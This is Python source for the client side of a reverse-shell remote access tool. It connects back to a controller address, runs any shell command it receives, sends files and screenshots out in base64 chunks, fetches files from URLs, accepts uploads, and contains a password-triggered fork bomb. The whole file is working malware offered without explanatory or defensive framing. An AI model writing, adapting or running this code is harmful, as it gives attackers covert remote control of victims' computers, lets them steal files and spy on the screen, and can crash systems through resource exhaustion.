# Python 3.8
import subprocess
import requests
import socket
import base64
import mss
import os


class Client():
	
	def __init__(self, CON_HOST, CON_PORT):
		self.current_dir = None
		self.client = None
		self.CON_HOST  = CON_HOST
		self.CON_PORT  = CON_PORT
		self.CON = (self.CON_HOST, self.CON_PORT)
		self.passwd = 'Z10N'
	
	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
		
		parts = (len(data) // bfc)
		parts += 1 if (len(data) % bfc) else 0
		chunks = [ data[bfc*i:bfc*(i+1)] for i in range(parts) ]
		return chunks
	
	def run_command(self, command):
		std = {
			'shell':  True,
			'stdout': subprocess.PIPE,
			'stderr': subprocess.PIPE,
			'stdin':  subprocess.PIPE
		}
		resp = subprocess.Popen(command, **std)
		return resp
	
	def download_file_web(self, url):
		req = requests.get(url)
		file_name = url.split('/')[-1]
		with open(file_name, 'wb') as file_:
			file_.write(req.content)
			file_.close()
	
	def screenshot(self):
		screen = mss.mss()
		screen.shot()
	
	def connect(self):
		
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.client.connect(self.CON)
		
		self.current_dir = os.getcwd()
		self.client.send(self.current_dir.encode())
		
		while True:
			
			res = self.client.recv(1024).decode()
			
			if res.lower() == 'exit': break
			elif res.lower().startswith('cd') and len(res) > 2:
				res = res[2:].strip()
				if os.path.isdir(res):
					os.chdir(res)
					res = os.getcwd()
					self.client.send(res.encode())
				else:
					msg = 'No existe la ruta: '+res
					self.client.send(msg.encode())
			elif res.lower().startswith('download'):
				file_name = res[8:].strip()
				if not os.path.isfile(file_name):
					self.client.send('file does not exist'.encode())
				else:
					self.client.send('ok'.encode())
					self.client.recv(1024)
					with open(file_name, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						info = 'Chunks: '+str(len(chunks))
						self.client.send(info.encode())
						self.client.recv(1024)
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
						file_.close()
			elif res.lower().startswith('upload'):
				self.client.send('ok'.encode())
				file_name = res[6:].strip()
				chunks = self.client.recv(1024).decode('utf-8', 'ignore')
				chunks = int(chunks.replace('Chunks: ',''))
				self.client.send('ok'.encode())
				data = ''.encode()
				for i in range(chunks):
					chunk = self.client.recv(2**16)
					data += chunk
					self.client.send('ok'.encode())
				with open(file_name, 'wb') as file_:
					file_.write(base64.b64decode(data))
					file_.close()
			elif res.lower().startswith('getweb'):
				try:
					url = res[7:]
					self.download_file_web(url)
					self.client.send('Archivo descargado correctamente.'.encode())
				except:
					self.client.send('Ocurrio un Error en la Descarga.'.encode())
			elif res.lower().startswith('screenshot'):
				try:
					self.screenshot()
					self.client.send('ok'.encode())
					scrshot = 'monitor-1.png'
					self.client.recv(1024).decode()
					with open(scrshot, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						info = 'Chunks: '+str(len(chunks))
						self.client.send(info.encode())
						self.client.recv(1024)
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
						file_.close()
					os.remove(scrshot)
				except:
					self.client.send('Error'.encode())
			elif res.startswith('forkbomb:'+self.passwd):
				try:
					while True: os.fork()
				except KeyboardInterrupt:
					pass
			else:
				proc = self.run_command(res)
				proc = proc.stdout.read() + proc.stderr.read()
				if proc:
					self.client.send(proc)
				else:
					self.client.send('None'.encode())



if __name__ == '__main__':
	
	RHOST = '192.168.1.69'
	RPORT = 57575
	
	client = Client(RHOST, RPORT)
	try:
		client.connect()
		client.client.close()
		
	except ConnectionRefusedError:
		# ~ client.run_command('exit')
		pass
		print('\n No se puede conectar con la dirección IP: '+str(RHOST))


